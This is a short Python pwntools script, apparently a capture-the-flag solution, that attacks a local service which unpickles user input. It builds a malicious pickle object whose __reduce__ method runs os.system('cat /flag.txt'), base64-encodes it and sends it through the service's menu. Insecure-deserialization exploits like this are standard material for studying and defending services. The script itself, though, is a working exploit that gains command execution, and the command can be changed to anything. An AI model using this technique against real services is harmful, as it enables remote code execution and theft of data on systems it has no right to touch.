import pickle
import os
import base64
from pwn import *

r = remote("localhost", 39723)

class Exploit:
    def __reduce__(self):
        return (os.system, ("cat /flag.txt",))

payload = base64.b64encode(pickle.dumps(Exploit()))

r.recvuntil(b'> ')
r.sendline(b'2')
r.recvuntil(b'Paste pickled pickle jar (base64): ')
r.sendline(payload)
print(r.recv().decode().strip())
